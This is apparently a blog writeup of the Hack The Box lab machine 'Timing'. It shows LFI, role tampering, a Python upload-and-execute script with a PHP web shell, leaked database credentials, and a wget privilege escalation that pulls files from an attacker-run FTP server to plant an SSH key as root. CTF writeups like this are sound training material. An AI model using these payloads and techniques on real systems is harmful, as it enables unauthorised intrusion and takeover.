---
title: Timing
tags: 
    - wget
    - LFI
    - File Upload and Execution
    - "Medium Machines"
category:
    - "Hack The Box Writeup"
date: 2022-01-18
description: "Hack The Box Machine - Timing writeup"
author: "Tejas"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
disableHLJS: false 
disableHLJS: false
hideSummary: true
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: false
UseHugoToc: true
cover:
    image: "https://pbs.twimg.com/media/FGQMw00XwAACETp?format=jpg&name=large" # image path/url
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
---

## Enumeration

### Open Ports

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6ADzomquiIRtawuW9q7/zghf1hv0AAFkbO79vcQkoaUG41EKKUfWdZAvSuQs/SfWcqFybWcfjUPfEzAZJAGQvlTIhZ1JY2fNklRVXPHtn7pa4x8ilt8EnknGefh3ZmlLod+RX+E7tU9uS8TWxZjfsWESVoIxTKmr+6p0mgPP8i166cpQWjdCOev+G8SoI42Yx53uMyy8j1f9FVun/59iQPrRCm3GvriULO9g3inWJXrSR//vu5v9Z4QxLS2uTQPLhkRr6jF4ATcd3PQJeEBAoZMim61pvb2rkFPnNyvZ7IaJtXk8+DxCjGK2QYEh4825oxk+EaYKBc4cTcRYBjQ/Z
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFTFC/194Ys9zdque1QtiNUgm1zDmvwpZyygR3joLJHC6pRTZtHR6+HwgJHBYC7k7OI8A5qqimTcibJNTFfyfj4=
|   256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAdZXeQCf1/rM6H0MCDVQ9d+24wwNti/hzCsKjyIpvmG
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Web Enumeration

### Sub Domain

{{< figure src="images/Untitled.png">}}

`ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://timing.htb/" -H "Host:FUZZ.timing.htb" -fc 302`

Found NONE

### Directory

{{< figure src="images/Untitled%201.png">}}

Interesting `image.php` with 200 response code and 0 content length 🧐.  Can I LFI 😈? 

`feroxbuster -u "http://timing.htb/" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -s 200 -x php`

## FootHold

### Found LFI

{{< figure src="images/Untitled%202.png">}}

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```

So we know the username is `aaron` . 

{{< figure src="images/Untitled%203.png">}}

We are able to login using `aaron:aaron` as credentials. 

### Testing Edit Profile for vulnerability

{{< figure src="images/Untitled%204.png">}}

Checking what happens

{{< figure src="images/Untitled%205.png">}}

HMm Interesting 🧐.

```json
{
    "id": "2",
    "0": "2",
    "username": "aaron",
    "1": "aaron",
    "password": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "2": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "lastName": "user",
    "3": "user",
    "firstName": "user",
    "4": "user",
    "email": "user",
    "5": "user",
    "role": "0",
    "6": "0",
    "company": "user",
    "7": "user"
}
```

{{< figure src="images/Untitled%206.png">}}

Will I be able to add another parameter as `role=1`. 

{{< figure src="images/Untitled%207.png">}}

Yes and lets look around what has happened. 

{{< figure src="images/Untitled%207.png">}}

I can see a admin panel

### Exploring Admin Panel

Let’s see if we can abuse feature for admin panel for reverse shell maybe. Before that lets read the source code of the page `avatar_uploader.php`

```php
<?php

include_once "header.php";

include_once "admin_auth_check.php";
?>

<script src="js/avatar_uploader.js"></script>

<style>
    .bg {
        padding: 30px;
        /* Full height */
        height: 100%;

        /* Center and scale the image nicely */
        background-position: center;
        background-repeat: no-repeat;
        background-size: cover;
    }
</style>

<div class="bg" id="main">

    <div class="alert alert-success" id="alert-uploaded-success" style="display: none">

    </div>

    <div class="alert alert-danger" id="alert-uploaded-error" style="display: none"
```

following source code is of `admin_auth_check.php`

```php
<?php

include_once "auth_check.php";

if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
    echo "No permission to access this panel!";
    header('Location: ./index.php');
    die();
}
```

following source code is of `image.php`

```php
<?php

function is_safe_include($text)
{
    $blacklist = array("php://input", "phar://", "zip://", "ftp://", "file://", "http://", "data://", "expect://", "https://", "../");

    foreach ($blacklist as $item) {
        if (strpos($text, $item) !== false) {
            return false;
        }
    }
    return substr($text, 0, 1) !== "/";

}

if (isset($_GET['img'])) {
    if (is_safe_include($_GET['img'])) {
        include($_GET['img']);
    } else {
        echo "Hacking attempt detected!";
    }
}
```

Source code of `js/avatar_uploader.js` 

```jsx
$(document).ready(function () {
    document.getElementById("main").style.backgroundImage = "url('/image.php?img=images/background.jpg'"
});

function doUpload() {

    if (document.getElementById("fileToUpload").files.length == 0) {
        document.getElementById("alert-uploaded-error").style.display = "block"
        document.getElementById("alert-uploaded-success").style.display = "none"
        document.getElementById("alert-uploaded-error").textContent = "No file selected!"
    } else {

        let file = document.getElementById("fileToUpload").files[0];  // file from input
        let xmlHttpRequest = new XMLHttpRequest();
        xmlHttpRequest.onreadystatechange = function () {
            if (xmlHttpRequest.readyState == 4 && xmlHttpRequest.status == 200) {

                if (xmlHttpRequest.responseText.includes("Error:")) {
                    document.getElementById("alert-uploaded-error").style.display = "block"
                    document.getElementById("alert-uploaded-success").style.display = "none"
                    document.getElementById("alert-uploaded-error").textContent = xmlHttpRequest.responseText;
                } else {
                    document.getElementById("alert-uploaded-error").style.display = "none"
                    document.getElementById("alert-uploaded-success").textContent = xmlHttpRequest.responseText;
                    document.getElementById("alert-uploaded-success").style.display = "block"
                }
```

Let’s check `upload.php` 

```php
<?php
include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>
```

Source code for `login.php`

```php
<?php

include "header.php";

function createTimeChannel()
{
    sleep(1);
}

include "db_conn.php";

if (isset($_SESSION['userid'])){
    header('Location: ./index.php');
    die();
}

if (isset($_GET['login'])) {
    $username = $_POST['user'];
    $password = $_POST['password'];

    $statement = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $result = $statement->execute(array('username' => $username));
    $user = $statement->fetch();

    if ($user !== false) {
        createTimeChannel();
        if (password_verify($password, $user['password'])) {
            $_SESSION['userid'] = $user['id'];
            $_SESSION['role'] = $user['role'];
	    header('Location: ./index.php');
            return;
        }
    }
    $errorMessage = "Invalid username or password entered";

}
?>
<?php
if (isset($errorMessage)) {

    ?>
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-10 col-md-offset-1">
                <div class="alert alert-danger alert-dismissible fade in text-center" role="alert"><strong>

                        <?php echo $errorMessage; ?>

                </div>
            </div>
        </div>
    </div>
    <?php
}
?>
    <link rel="stylesheet" href="./css/login.css">

    <div class="wrapper fadeInDown">
        <div id="formContent">
            <div class="fadeIn first" style="padding: 20px">
                <img src="./images/user-icon.png" width="100" height="100"/>
            </div>

            <form action="?login=true" method="POST">

                <input type="text" id="login" class="fadeIn second" name="user" placeholder="login">

                <input type="text" id="password" class="fadeIn third" name="password" placeholder="password">

                <input type="submit" class="fadeIn fourth" value="Log In">

            </form>

            <!-- todo -->
            <div id="formFooter">
                <a class="underlineHover" href="#">Forgot Password?</a>
            </div>

        </div>
    </div>

<?php
include "footer.php";
```

Let’s see what is in `db_conn.php`

```php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

### RCE

```python
#!/usr/bin/env python3
import requests
import time
import hashlib

IP = "timing.htb"
PHPSESSID = "gce7q6752ufiafcghda2n782lr" #Your PHPSESSID

files = {
    "fileToUpload": (
        f"test.jpg", 
        b"<?php system($_GET[cmd]);?>", 
        "application/php", 
        {"Expires": "0"},
    )
}

timestamp = int(time.time())
req = requests.post("http://" + IP + "/upload.php", files=files, cookies={
    "PHPSESSID": PHPSESSID
})

for i in range(timestamp - 5, timestamp + 5):
    fname = hashlib.md5(("$file_hash"+str(i)).encode()).hexdigest() + "_test.jpg"
    req = requests.get("http://" + IP + "/images/uploads/" + fname)

    if req.status_code != 404:
        print("[*] Gotta file uploaded!")
        print("[*] RCE: http://" + IP + "/image.php?img=images/uploads/" + fname + "&cmd=init")
    else:
        print("[-] Exploit failed")
```

{{< figure src="images/Untitled%209.png">}}

{{< figure src="images/Untitled%2010.png">}}

I will use [webwrap](https://github.com/mxrch/webwrap) to get a quick *shell* *like*

{{< figure src="images/Untitled%2011.png">}}

{{< figure src="images/Untitled%2012.png">}}

Found mysql credentails.

`root:4_V3Ry_l0000n9_p422w0rd`

Let’s enumerate the box with mysql oneliners as we are not able to get reverse shell. Nor login with that password as aaron in ssh.

{{< figure src="images/Untitled%2013.png">}}

`mysql -uroot -p"4_V3Ry_l0000n9_p422w0rd" -D app -e "show tables;"`

Found backups directory in `/opt` after extracting I found it had git. after comparing the `diff`

 of commit we get the credentials.

{{< figure src="images/Untitled%2014.png">}}

{{< figure src="images/Untitled%2015.png">}}

`S3cr3t_unGu3ss4bl3_p422w0Rd`

I tried using the above password for user aaron and it worked I got **user flag**

## Privilege Escalation

{{< figure src="images/Untitled%2016.png">}}

I ran psypy64 and in another SSH terminal I ran the binary and found it runs axel and wget for http and ftp respectively. Let’s abuse wget. 

### Setting up FTP server

```python
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

authorizer = DummyAuthorizer()
# authorizer.add_user("user", "12345", "/home/username", perm="elradfmw")
# authorizer.add_anonymous("/home/username", perm="elradfmw")
authorizer.add_anonymous("/home/tejas/HTB/BOX/Timing/ftpserver/", perm="elradfmw")

handler = FTPHandler
handler.authorizer = authorizer

server = FTPServer(("10.10.14.42", 21), handler)
server.serve_forever()
```

Now I realized after several attempt that `anonymous:anonymous@10.10.14.42/id_rsa.pub -O /root/.ssh/authorized_keys` as command won’t work as it takes whole input as URL.

So I found another way, is to write wget’s config in `.wgetrc` as `output_document = /root/.ssh/authorized_keys` as it mentions where the wget to store the output file by default. 

Thus I requested my SSH public key and stored it in authorized_keys in the remote user’s root. And Now I was able to login. 

**Got SSH session as root.**